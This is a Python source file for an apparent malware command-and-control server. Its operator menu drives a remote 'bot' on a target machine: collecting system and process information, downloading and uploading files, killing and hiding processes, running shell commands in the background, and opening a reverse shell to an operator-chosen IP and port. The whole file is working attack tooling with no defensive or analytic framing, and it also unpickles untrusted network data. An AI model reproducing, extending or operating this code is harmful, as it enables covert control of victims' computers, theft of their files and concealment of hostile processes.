#!/usr/bin/env python3

import threading
import socket
import socketserver
import pickle
import os

cur_cmd = "NONE"
list_thread = 0
client = 0
class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
    def recvuntil(self, n):
        buf = ""
        while True:
            buf += str(self.request.recv(len(n)), 'ascii')
            if n in buf:
                return buf

    def sendline(self, n):
        self.request.sendall(bytes(n+'\n', 'utf-8'))

    def handle(self):
        global list_thread
        global client
        global cur_cmd
        list_thread = threading.current_thread()
        #print(list_thread.name)
        client = 1
        cmd = self.recvuntil('\n')
        self.sendline(cur_cmd)
        if cur_cmd == "SYSINFO":
            sz = int(self.recvuntil('\n'))
            data = self.request.recv(sz)
            info = pickle.loads(data)
            for k, v in info.items():
                if "Interface" not in k:
                    print("{0} : {1}".format(k.ljust(10), v))
            ifi = info["Interface"]
            for k,v in ifi.items():
                print("    Interface : <{0}>".format(k))
                print("      Address : <{0}>".format(v))
            cur_cmd = "NONE"
        elif cur_cmd == "PROCINFO":
            sz = int(self.recvuntil('\n'))
            data = self.request.recv(sz)
            procs = pickle.loads(data)
            print("{0}{1}{2}{3}{4}".format("PID".ljust(6), "PPID".ljust(6), "Status".ljust(9), "Name".ljust(10), "CMD".ljust(8)))
            for proc in procs:
                print("{0}{1}{2}{3}{4}".format(str(proc['pid']).ljust(6), str(proc['ppid']).ljust(6), proc['status'].ljust(9), proc['commname'].ljust(10), proc['cmdline']))
            cur_cmd = "NONE"
        elif cur_cmd == "SHELL":
            ip = input("IP : ")
            port = input("Port : ")
            self.sendline(ip)
            self.sendline(port)
            t = int(self.recvuntil('\n'))
            if t == -1:
                print("connect error")
            cur_cmd = "NONE"
        elif cur_cmd == "KILLPROC":
            pid = input("Insert PID you want to kill : ")
            self.sendline(pid)
            cur_cmd = "NONE"
        elif cur_cmd == "HIDEPROC":
            pid = input("Insert PID you want to hide : ")
            self.sendline(pid)
            cur_cmd = "NONE"
        elif cur_cmd == "UNHIDEPROC":
            pid = input("Insert PID you want to unhide : ")
            self.sendline(pid)
            cur_cmd = "NONE"
        elif cur_cmd == "STARTPROC":
            prog = input("Insert path process you want to start : ")
            self.sendline(prog)
            pid = int(self.recvuntil('\n'))
            print("Process start with pid {0}".format(pid))
            cur_cmd = "NONE"
        elif cur_cmd == "EXECSYS":
            prog = input("Insert shell command : ")
            self.sendline(prog)
            cur_cmd = "NONE"
        elif cur_cmd == "LOADFILE":
            path = input("Insert PATH you want to download : ")
            outp = input("Set output file : ")
            self.sendline(path)
            sz = int(self.recvuntil('\n'))
            if(sz == -1):
                print("Can't load file")
            else:
                print("Size : {0}".format(sz))
                data = str(self.request.recv(sz), 'ascii')
                if(len(data) == sz):
                    with open(outp, "w+") as fout:
                        fout.write(data)
                else:
                    print("Error read file")
            cur_cmd = "NONE"
        elif cur_cmd == "PUTFILE":
            path = input("Insert PATH you want to upload : ")
            outp = input("Insert PATH destination in target : ")
            with open(path, "r") as f:
                sz = os.path.getsize(path)
                data = f.read(sz)
            self.sendline(outp)
            self.sendline(str(sz))
            self.request.sendall(bytes(data, 'utf-8'))
            cur_cmd = "NONE"
        self.sendline("END")
        client = 0

class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    pass

if __name__ == '__main__':
    HOST, PORT = "localhost", 4444
    list_cmd = ["SYSINFO","LOADFILE","PUTFILE","PROCINFO","KILLPROC","HIDEPROC","UNHIDEPROC","SHELL","STARTPROC","EXECSYS"]
    socketserver.TCPServer.allow_reuse_address = True
    server = ThreadedTCPServer((HOST, PORT), ThreadedTCPRequestHandler)
    ip, port = server.server_address

    # Start a thread with the server -- that thread will then start one
    # more thread for each request
    server_thread = threading.Thread(target=server.serve_forever)
    # Exit the server thread when the main thread terminates
    server_thread.daemon = True
    server_thread.start()
    while True:
        print("====================[ CNC SERVER ]====================")
        print("| List command    :")
        print("| - SYSINFO       : Display target system info")
        print("| - LOADFILE      : Download file from target")
        print("| - PUTFILE       : Upload file to target")
        print("| - PROCINFO      : Display process information/list")
        print("| - KILLPROC      : Kill pid target process")
        print("| - HIDEPROC      : Hide pid target process")
        print("| - UNHIDEPROC    : Unhide pid target process")
        print("| - SHELL         : Create revere shell connect to ip/port")
        print("| - STARTPROC     : Start new process without args (args not implemented yet)")
        print("| - EXECSYS       : Execute shell command in background")
        print("| - EXIT          : Exit session")
        print("--> ", end='')
        cmd = input("Enter command : ").upper()
        if cmd == "EXIT":
            break
        if cmd not in list_cmd:
            print("Command not found")
            continue
        cur_cmd = cmd
        print("waiting bot connection..")
        while cur_cmd != "NONE":
            continue
    server.shutdown()
    server.server_close()
